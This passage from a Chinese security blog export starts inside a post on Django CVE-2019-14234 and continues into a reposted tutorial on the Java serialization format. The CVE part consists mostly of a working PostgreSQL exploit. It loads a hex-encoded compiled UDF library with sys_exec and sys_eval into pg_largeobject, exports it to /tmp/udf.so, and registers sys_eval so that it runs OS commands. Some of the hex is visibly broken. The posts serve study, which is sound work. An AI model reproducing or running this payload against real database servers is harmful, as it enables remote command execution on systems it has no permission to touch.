00100c00000000000000000000000000002f01000012000c006d1100000000000000010000000000007500000012000c00d00e0000000000000d000000000000001600000012000d00a01400000000000000000000000000005501000012000c006d120000000000000d00000000000000a600000012000c003f0f0000000000007000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006d656d637079006368725f7074725f746f5f746578745f707472007374726c656e0070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e007265616c6c6f63007374726e6370790066676574730070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">1</span>, decode(<span class="string">&#x27;616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164005f5f737461636b5f63686b5f6661696c006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e313400474c4942435f322e3400474c4942435f322e322e3500000000000200020000000200020002000300020002000200020002000000040000000200020002000200020002000200000000000200000002000100010001000100010001000100010001000100010001000100010001000100010003009b01000010000000000000009491960600000400bd010000100000001469690d00000300c801000010000000751a690900000200d201000000000000001e2000000000000800000000000000a00e000000000000081e2000000000000800000000000000600e000000000000d8202000000000000800000000000000d820200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000e0000000000000000000000e81f20000000000006000000180000000000000000000000f01f20000000000006000000190000000000000000000000f81f200000000000060000001a00000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000000b00000000000000000000006020200000000000070000000c00000000000000000000006820200000000000070000002500000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000f0000000000000000000000802020000000000007000000100000000000000000000000882020000000000007000000110000000000000000000000902020000000000007000000120000000000000000000000982020000000000007000000130000000000000000000000a02020000000000007000000140000000000000000000000a82020000000000007000000150000000000000000000000b02020000000000007000000160000000000000000000000b82020000000000007000000170000000000000000000000c020200000000000070000001b0000000000000000000000c820200000000000070000001c0000000000000000000000d020200000000000070000002c00000000000000000000004883ec08488b05c51320004885c07405e89b0100004883c408c3000000000000ff35d2132000ff25d41320000f1f4000ff25d21320006800000000e9e0ffffffff25ca1320006801000000e9d0ffffffff25c21320006802000000e9c0ffffffff25ba1320006803000000e9b0ffffffff25b21320006804000000e9a0ffffffff25aa1320006805000000e990ffffffff25a21320006806000000e980ffffffff259a1320006807000000e970ffffffff25921320006808000000e960ffffffff258a1320006809000000e950ffffffff2582132000680a000000e940ffffffff257a132000680b000000e930ffffffff2572132000680c000000e920ffffffff256a132000680d000000e910ffffffff2562132000680e000000e900ffffffff255a132000680f000000e9f0feffffff25521320006810000000e9e0feffffff254a1320006811000000e9d0feffffff25421320006812000000e9c0feffffff253a1320006813000000e9b0feffffff25321320006814000000e9a0feffffff252a1320006815000000e990feffffff25221320006816000000e980feffffff251a1320006817000000e970feffffff251a1220006690ff252a1220006690488d3d09132000488d0509132000554829f84889e54883f80e7615488b05e61120004885c074095dffe0660f1f4400005dc30f1f4000662e0f1f840000000000488d3dc9122000488d35c2122000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05b11120004885c0740c5dffe0660f1f8400000000005dc30f1f4000662e0f1f840000000000803d7912200000752748833d8711200000554889e5740c488b3d5a122000e845ffffffe848ffffff5dc6055012200001f3c30f1f4000662e0f1f840000000000488d3d690f200048833f00750be95effffff660f1f440000488b05291120004885c074e9554889e5ffd05de940ffffff554889e5488d05e50500005dc3554889e54883ec2048897de8488b45e88b00c1e80283e8048945f48b45f483c00148984889c7e818feffff488945f88b45f44863d0488b45e8488d4804488b45f84889ce4889c7e8d7fdffff8b45f44863d0488b45f84801d0c60000488b45f8c9c3554889e54883ec2048897de8488b45e84889c7e829fdffff4883c0044889c7e8bdfdffff488945f8488b45e84889c7e80dfdffff83c0048d148500000000488b45f88910488b45e84889c7e8f1fcffff4889c2488b45f8488d4804488b45e84889c64889cfe857fdffff488b45f8c9c3554889e5488d05220500005dc3554889e54883ec3048897dd8488b45d8488b40204889c7e838fdffff488945f0c745ec00000000488b45f04889c7e8f1fcffff488945f8488b45f84889c7e8b1fcffff89&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">2</span>, decode(<span class="string">&#x27;45ec488b45f84889c7e832fcffff488b45d8488b4020483b45f0740c488b45f04889c7e868fdffff8b45ec489889c0c9c3554889e5488d05a40400005dc3554889e54883ec5048897db8488b45b8488b40204889c7e8b6fcffff488945d8488b45d84889c7e876fcffff488945e0bf00040000e8a8fcffff488945e8bf01000000e89afcffff488945d0c745c800000000488b45d0c60000488b45e0488d350d0400004889c7e8b5fcffff488945f0eb55488b45e84889c7e8c3fbffff8945cc8b55c88b45cc01d04863d0488b45d04889d64889c7e866fcffff488945d08b45cc4863d08b45c84863c8488b45d04801c1488b45e84889c64889cfe850fbffff8b45cc0145c8488b55f0488b45e8be080000004889c7e8b5fbffff4885c07591488b45f04889c7e894fbffff488b45d00fb60084c074138b45c84898488d50ff488b45d04801d0c60000488b45d04889c7e85afcffff488945f8488b45f8c9c3554889e5488d05790300005dc3554889e54883ec4048897dc8488b45c8488b40204889c7e887fbffff488945e0488b45e08b00c1e80283e8048945d88b45d84898488945e8e8f6fbffff8945dc837ddc00790ab801000000e9ae000000837ddc000f8585000000bf1e000000e8affbffff4883e801488945f0488b55e8488b45f04801c2488b45f048f7d04821d0488945f0488b45f041b90000000041b800000000b921000000ba070000004889c6bf00000000e887faffff488945f848837df8ff7507b801000000eb40488b45e0488d4804488b55e8488b45f84889ce4889c7e80afaffff488b45f8ffd0837ddc007e148b45dcba01000000be0000000089c7e8eafaffffb800000000c9c3554889e5488d05700200005dc3554889e54883ec7048897d9864488b042528000000488945f831c0488b4598488b40204889c7e86bfaffff488945b048b83031323334353637488945e048b83839414243444546488945e8c645f000488b45b04889c7e80bfaffff488945b8488b45b8488d35ce0100004889c7e884faffff488945c048837dc0007512488b4598c6401c01b800000000e97f010000488b45c0ba02000000be000000004889c7e811faffff488b45c04889c7e8c5f9ffff8945ac488b45c0ba00000000be000000004889c7e8ecf9ffff8b45ac83c00148984889c7e8ccf9ffff488945c848837dc800751e488b45c04889c7e805f9ffff488b4598c6401c01b800000000e90b0100008b45ac4863f0488b55c0488b45c84889d1ba010000004889c7e8c5f8ffff488b45c04889c7e8c9f8ffff8b45ac01c083c00148984889c7e867f9ffff488945d0c745a400000000c745a800000000eb6b8b45a88d50018955a84863d0488b45d04801c28b45a44863c8488b45c84801c80fb600c0f8040fbec083e00f48980fb64405e088028b45a88d50018955a84863d0488b45d04801c28b45a44863c8488b45c84801c80fb6000fbec083e00f48980fb64405e088028345a4018b45a43b45ac7c8d8b45a84863d0488b45d04801d0c60000488b45d04889c7e854f9ffff488945d8488b45d04889c7e8d4f7ffff488b45c84889c7e8c8f7ffff488b45b84889c7e8bcf7ffff488b45d8488b4df86448330c25280000007405e8f4f7ffffc9c300004883ec084883c408c300000000000000720072620000000000000000000000001c0000008a030000640000002000000040000000010000000100000001000000010000000100000001000000011b033b680000000c00000044f7ffff84000000e4f9ffffac000000f1f9ffffcc00000053faffffec000000c3faffff0c010000d0faffff2c01000045fbffff4c01000052fbffff6c01000074fcffff8c01000081fcffffac01000081fdffffcc0100008efdffffec0100001400000000000000017a5200017810011b0c070890010000240000001c000000b8f6ffff90010000000e10460e184a0f0b770880003f1a3b2a332422000000001c0000004400000030f9ffff0d00000000410e108602430d06480c07080000001c000000640000001df9ffff6200000000410e108602430d06025d0c070800001c000000840000005ff9ffff7000000000410e108602430d06026b0c070800001c000000a4000000aff9ffff0d00000000410e108602430d06480c07080000001c000000c40000009cf9ffff7500000000410e108602430d0602700c070800001c000000e4000000f1f9ffff0d00000000410e108602430d06480c07080000001c00000004010000def9ffff2201000000410e108602430d06031d010c0708001c00000024010000e0faffff0d00000000410e108602430d06480c07080000001c00000044010000cdfaffff0001000000410e108602430d0602fb0c070800001c00000064010000adfbffff0d00000000410e108602430d06480c07080000001c000000840100009afbffff2402000000410e108602430d06031f020cx27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">3</span>, decode(<span class="string">&#xa00e000000000000600e000000000000000000000000000001000000000000009b010000000000000c00000000000000100c0000000000000d00000000000000a0140000000000001900000000000000001e2000000000001b0000000000000008000000000000001a00000000000000081e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000009806000000000000060000000000000060020000000000000a00000000000000de010000000000000b0000000000000018000000000000000300000000000000002020000000000002000000000000004002000000000000140000000000000007000000000000001700000000000000d009000000000000070000000000000010090000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f00000000d008000000000000ffffff6f000000000100000000000000f0ffff6f000000007608000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">4</span>, decode(<span class="string">&#x27;181e20000000000000000000000000000000000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c000000000000060d000000000000160d000000000000260d000000000000360d000000000000460d000000000000560d000000000000660d000000000000760d000000000000860d000000000000960d000000000000a60d000000000000b60d000000000000d8202000000000004743433a20285562756e747520352e342e302d367562756e7475317e31362e30342e31312920352e342e30203230313630363039000000000000000000000000000000000000000000000000000000000000000003000100c80100000000000000000000000000000000000003000200f00100000000000000000000000000000000000003000300600200000000000000000000000000000000000003000400980600000000000000000000000000000000000003000500760800000000000000000000000000000000000003000600d00800000000000000000000000000000000000003000700100900000000000000000000000000000000000003000800d00900000000000000000000000000000000000003000900100c00000000000000000000000000000000000003000a00300c00000000000000000000000000000000000003000b00c00d00000000000000000000000000000000000003000c00d00d00000000000000000000000000000000000003000d00a01400000000000000000000000000000000000003000e00b01400000000000000000000000000000000000003000f00ec1400000000000000000000000000000000000003001000581500000000000000000000000000000000000003001100001e20000000000000000000000000000000000003001200081e20000000000000000000000000000000000003001300101e20000000000000000000000000000000000003001400181e20000000000000000000000000000000000003001500d81f20000000000000000000000000000000000003001600002020000000000000000000000000000000000003001700d82020000000000000000000000000000000000003001800e0202000000000000000000000000000000000000300190000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001300101e20000000000000000000000000001900000002000c00d00d00000000000000000000000000001b00000002000c00100e00000000000000000000000000002e00000002000c00600e00000000000000000000000000004400000001001800e02020000000000001000000000000005300000001001200081e20000000000000000000000000007a00000002000c00a00e00000000000000000000000000008600000001001100001e2000000000000000000000000000a50000000400f1ff00000000000000000000000000000000bd00000001000e00c0140000000000001c00000000000000d000000001000e00dc140000000000000400000000000000de00000001000e00e0140000000000000400000000000000ec00000001000e00e4140000000000000400000000000000fa00000001000e00e8140000000000000400000000000000010000000400f1ff000000000000000000000000000000000801000001001000f81600000000000000000000000000001601000001001300101e2000000000000000000000000000000000000400f1ff000000000000000000000000000000002201000001001700d82020000000000000000000000000002f01000001001400181e20000000000000000000000000003801000000000f00ec1400000000000000000000000000004b01000001001700e02020000000000000000000000000005701000001001600002020000000000000000000000000006d01000012000000000000000000000000000000000000007f01000012000c00d00e0000000000000d000000000000008d0100001200000000000000000000000000000000000000a20100002000000000000000000000000000000000000000be01000012000c0060110000000000000d00000000000000d301000012000c0031100000000000000d00000000000000e501000012000000000000000000000000000000000000009f02000012000c00bc0f0000000000007500000000000000f801000010001700e0202000000000000000000000000000ff01000012000000000000000000000000000000000000001302000012000d00a01400000000000000000000000000001902000012000000000000000000000000000000000000002d02000012000000000000000000000000000000000000004902000012000000000000000000000000000000000000005b02000012000000000000000000000000000000000000006f02000012000000000000000000000000000000000000008302000012000000000000000000000000000000000000009602000012000c00af0f0000000000000d00000000000000a802000012000c00dd0e0000000000006200000000000000dc01000012000c003e100000000000002201000000000000bd0200001200000000000000000000000000000000000000d00200002000000000000000000000000000000000000000df0200001200000000000000000000000000000000000000f2020000100000000000000000000000&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">5</span>, decode(<span class="string">&#x27;00000000000000000303000012000000000000000000000000000000000000001703000010001800e82020000000000000000000000000001c03000012000000000000000000000000000000000000002f03000012000000000000000000000000000000000000004403000010001800e02020000000000000000000000000005003000012000000000000000000000000000000000000006503000012000000000000000000000000000000000000007803000012000000000000000000000000000000000000008b0300001200000000000000000000000000000000000000a00300002000000000000000000000000000000000000000b403000020000000000000000000000000000000000000001104000012000c007a120000000000002402000000000000ce0300002200000000000000000000000000000000000000ea03000012000900100c0000000000000000000000000000f00300001000000000000000000000000000000000000000c701000012000c006d110000000000000001000000000000f603000012000000000000000000000000000000000000000804000012000c006d120000000000000d000000000000001e04000012000c003f0f00000000000070000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e37353934005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006c69625f706f737467726573716c7564665f7379732e630050675f6d616769635f646174612e35383133006d795f66696e666f2e35383331006d795f66696e666f2e35383436006d795f66696e666f2e35383639006d795f66696e666f2e35383838005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00667265654040474c4942435f322e322e350050675f6d616769635f66756e63007374726e6370794040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c650070675f66696e666f5f7379735f62696e6576616c0070675f66696e666f5f7379735f6576616c0066726561644040474c4942435f322e322e35005f65646174610066636c6f73654040474c4942435f322e322e35005f66696e69007374726c656e4040474c4942435f322e322e35005f5f737461636b5f63686b5f6661696c4040474c4942435f322e34006d6d61704040474c4942435f322e322e350073797374656d4040474c4942435f322e322e350070636c6f73654040474c4942435f322e322e350066676574734040474c4942435f322e322e350070675f66696e666f5f7379735f6578656300746578745f7074725f746f5f636861725f707472006674656c6c4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f006d656d6370794040474c4942435f322e31340070675f6465746f6173745f646174756d006d616c6c6f634040474c4942435f322e322e35005f656e6400667365656b4040474c4942435f322e322e35007265616c6c6f634040474c4942435f322e322e35005f5f6273735f737461727400776169747069644040474c4942435f322e322e3500706f70656e4040474c4942435f322e322e3500666f70656e4040474c4942435f322e322e3500737973636f6e664040474c4942435f322e322e35005f4a765f5265676973746572436c6173736573005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35005f696e697400706672656500666f726b4040474c4942435f322e322e350070675f66696e666f5f7379735f66696c6572656164006368725f7074725f746f5f746578745f70747200002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e64796e616d6963002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000380000000b00000002000000000000006002000000000000600200000000000038040000000000000400000002000000080000000000000018000000000000004000000003000000&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">6</span>, decode(<span class="string">&#x27;020000000000000098060000000000009806000000000000de0100000000000000000000000000000100000000000000000000000000000048000000ffffff6f0200000000000000760800000000000076080000000000005a0000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000d008000000000000d00800000000000040000000000000000400000001000000080000000000000000000000000000006400000004000000020000000000000010090000000000001009000000000000c0000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000d009000000000000d009000000000000400200000000000003000000160000000800000000000000180000000000000078000000010000000600000000000000100c000000000000100c0000000000001a0000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000300c000000000000300c00000000000090010000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000c00d000000000000c00d000000000000100000000000000000000000000000000800000000000000000000000000000087000000010000000600000000000000d00d000000000000d00d000000000000ce060000000000000000000000000000100000000000000000000000000000008d000000010000000600000000000000a014000000000000a014000000000000090000000000000000000000000000000400000000000000000000000000000093000000010000000200000000000000b014000000000000b0140000000000003c000000000000000000000000000000100000000000000000000000000000009b000000010000000200000000000000ec14000000000000ec140000000000006c00000000000000000000000000000004000000000000000000000000000000a900000001000000020000000000000058150000000000005815000000000000a401000000000000000000000000000008000000000000000000000000000000b30000000e0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000bf0000000f0000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000cb000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000d0000000060000000300000000000000181e200000000000181e000000000000c00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d900000001000000030000000000000000202000000000000020000000000000d800000000000000000000000000000008000000000000000800000000000000e2000000010000000300000000000000d820200000000000d8200000000000000800000000000000000000000000000008000000000000000000000000000000e8000000080000000300000000000000e020200000000000e0200000000000000800000000000000000000000000000001000000000000000000000000000000ed0000000100000030000000000000000000000000000000e0200000000000003500000000000000000000000000000001000000000000000100000000000000110000000300000000000000000000000000000000000000022e000000000000f6000000000000000000000000000000010000000000000000000000000000000100000002000000000000000000000000000000000000001821000000000000b8080000000000001c0000003200000008000000000000001800000000000000090000000300000000000000000000000000000000000000d0290000000000003204000000000000000000000000000001000000000000000000000000000000&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12345</span>, <span class="string">&#x27;/tmp/udf.so&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_unlink(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">FUNCTION</span> sys_eval(text) <span class="keyword">RETURNS</span> text <span class="keyword">AS</span> <span class="string">&#x27;/tmp/udf.so&#x27;</span>, <span class="string">&#x27;sys_eval&#x27;</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">RETURNS</span> <span class="keyword">NULL</span> <span class="keyword">ON</span> <span class="keyword">NULL</span> INPUT IMMUTABLE;  #执行命令</span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval(text);  #删除函数</span><br></pre></td></tr></table></figure></div>

<h2 id="瞎扯一会"><a href="#瞎扯一会" class="headerlink" title="瞎扯一会"></a>瞎扯一会</h2><p>这个CVE还有很多要学习的，先挖个坑，后面去花些时间了解一下 <code>jsonField</code><br>(ps: 自己挖的坑越来越多了)</p>
<p>开学了，每天最近因为一些新的考研政策出台，搞得自己有些焦虑急躁，慢慢静下心来好好准备吧。</p>
<hr>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/5896">CVE-2019-14234 Django JSON SQL注入 分析</a><br><a href="https://www.leavesongs.com/penetration/django-jsonfield-cve-2019-14234.html">Django JSONField SQL注入漏洞（CVE-2019-14234）分析与影响</a><br><a href="https://blog.csdn.net/qq_41420747/article/details/103539487">CVE-2019-14234笔记</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析Java序列化和反序列化 [转载]</title>
    <url>/yakko117/2020/02/28/about-java-serialization-and-deserialization/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>github 上看到的，边看边学，边记笔记<br><a href="https://github.com/gyyyy">感谢宫音师傅的文章</a></p>
<span id="more"></span>

<h1 id="浅析Java序列化和反序列化"><a href="#浅析Java序列化和反序列化" class="headerlink" title="浅析Java序列化和反序列化"></a>浅析Java序列化和反序列化</h1><p>别说你懂反序列化，也别再说你不懂反序列化。</p>
<h1 id="序列化机制"><a href="#序列化机制" class="headerlink" title="序列化机制"></a>序列化机制</h1><p>序列化 <code>Serialization</code> 是指将数据结构或对象状态转换成字节流，例如 <code>存储成文件、内存缓冲，或经由网络传输</code> ，以留待后续在相同或另一台计算机环境中，能够恢复对象原来状态的过程。序列化机制在Java中有着广泛的应用，<code>EJB、RMI、Hessian</code> 等技术都以此为基础。</p>
<hr>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>我们先用一个简单的序列化示例来看看Java究竟是如何对一个对象进行序列化的：</p>
<h2 id="简单序列化示例"><a href="#简单序列化示例" class="headerlink" title="简单序列化示例"></a>简单序列化示例</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationDemo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String stringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SerializationDemo</span><span class="params">(String s, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.stringField = s;</span><br><span class="line">        <span class="built_in">this</span>.intField = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bout);</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> <span class="title class_">SerializationDemo</span>(<span class="string">&quot;gyyyy&quot;</span>, <span class="number">97777</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果熟悉PHP的同学应该知道，这个对象在经过PHP序列化后得到的字符串如下 <font color="#0099ff">因为PHP与Java的编程习惯有所区别</font>，这里字段访问权限全改为了<code>public</code>，<code>private</code>和<code>protected</code>从表现形式上来说差不多，只是多了些特殊的标识而已，为了减少一些零基础的同学不必要的疑惑，这里暂不讨论：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:17:&quot;SerializationDemo&quot;:2:&#123;s:11:&quot;stringField&quot;;s:5:&quot;gyyyy&quot;;s:8:&quot;intField&quot;;i:97777;&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中，<code>O:17:&quot;...&quot;</code> 表示当前是一个 <code>(Object)对象</code>，以及该对象类名的字符串长度和值，<code>2:&#123;...&#125;</code> 表示该类有2个字段 （元素间用 <code>;</code> 分隔，键值对也分为前后两个元素表示，也就是说，如果是2个字段，则总共会包含4个元素），<code>s:11:&quot;...&quot;</code> 表示当前是一个长度为11的字符串，<code>i:...</code> 表示当前是一个 <code>整数(integer)</code>。</p>
<p>由此可知，PHP序列化字符串基本上是可人读的，而且对于类对象来说，字段等成员属性的序列化顺序与定义顺序一致。我们完全可以通过手工的方式来构造任意一个PHP对象的序列化字符串。</p>
<hr>
<h3 id="Java序列化二进制字符串"><a href="#Java序列化二进制字符串" class="headerlink" title="Java序列化二进制字符串"></a>Java序列化二进制字符串</h3><p><font color="#0099ff">而该对象经过Java序列化后得到的则是一个二进制串：</font></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 11  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 44 65 6d  6f d9 35 3c f7 d6 0a c6    ationDem o.5&lt;....</span><br><span class="line">d5 02 00 02 49 00 08 69  6e 74 46 69 65 6c 64 4c    ....I..i ntFieldL</span><br><span class="line">00 0b 73 74 72 69 6e 67  46 69 65 6c 64 74 00 12    ..string Fieldt..</span><br><span class="line">4c 6a 61 76 61 2f 6c 61  6e 67 2f 53 74 72 69 6e    Ljava/la ng/Strin</span><br><span class="line">67 3b 78 70 00 01 7d f1  74 00 05 67 79 79 79 79    g;xp..&#125;. t..gyyyy</span><br></pre></td></tr></table></figure></div>

<p>仔细观察二进制串中的部分可读数据，我们也可以差不多分辨出该对象的一些基本内容。但同样为了手写的目的 <em>（为什么有这个目的？原因很简单，为了不被语言环境束缚）</em> ，以及为接下来的序列化执行流程分析做准备，我们先依次来解读一下这个二进制串中的各个元素。</p>
<ul>
<li><code>0xaced</code>，魔术头</li>
<li><code>0x0005</code>，版本号 （JDK主流版本一致，下文如无特殊标注，都以<font color="red">JDK8u</font>为例）</li>
<li><code>0x73</code>，对象类型标识 <em>（<code>0x7n</code>基本上都定义了类型标识符常量，但也要看出现的位置，毕竟它们都在可见字符的范围，详见<code>java.io.ObjectStreamConstants</code>）</em></li>
<li><code>0x72</code>，类描述符标识</li>
<li><code>0x0011...</code>，类名字符串长度和值 <em>（Java序列化中的UTF8格式标准）</em></li>
<li><code>0xd9353cf7d60ac6d5</code>，序列版本唯一标识 <em>（<code>serialVersionUID</code>，简称SUID）</em></li>
<li><code>0x02</code>，对象的序列化属性标志位，如是否是Block Data模式、自定义<code>writeObject()</code>，<code>Serializable</code>、<code>Externalizable</code>或<code>Enum</code>类型等</li>
<li><code>0x0002</code>，类的字段个数</li>
<li><code>0x49</code>，整数类型签名的第一个字节，同理，之后的<code>0x4c</code>为字符串类型签名的第一个字节 <font color="#0099ff">（类型签名表示与JVM规范中的定义相同）</font></li>
<li><code>0x0008...</code>，字段名字符串长度和值，非原始数据类型的字段还会在后面加上数据类型标识、完整类型签名长度和值，如之后的<code>0x740012...</code></li>
<li><code>0x78</code> Block Data结束标识</li>
<li><code>0x70</code> 父类描述符标识，此处为<code>null</code></li>
<li><code>0x00017df1</code> 整数字段<code>intField</code>的值 <em>（Java序列化中的整数格式标准）</em> ，非原始数据类型的字段则会按对象的方式处理，如之后的字符串字段<code>stringField</code>被识别为字符串类型，输出字符串类型标识、字符串长度和值</li>
</ul>
<p>由此可以看出，除了基本格式和一些整数表现形式上的不同之外，Java和PHP的序列化结果还是存在很多相似的地方，比如除了具体值外都会对类型进行描述。</p>
<p>需要注意的是，Java序列化中对字段进行封装时，会按原始和非原始数据类型排序 <em>（有同学可能想问为什么要这么做，这里我只能简单解释原因有两个，一是因为它们两个的表现形式不同，原始数据类型字段可以直接通过偏移量读取固定个数的字节来赋值；二是在封装时会计算原始类型字段的偏移量和总偏移量，以及非原始类型字段的个数，这使得反序列化阶段可以很方便的把原始和非原始数据类型分成两部分来处理）</em> ，且其中又会按字段名排序。</p>
<p>而开头固定的<code>0xaced0005</code>也可以作为Java序列化二进制串 <em>（Base64编码为<code>rO0AB...</code>）</em> 的识别标识。</p>
<hr>
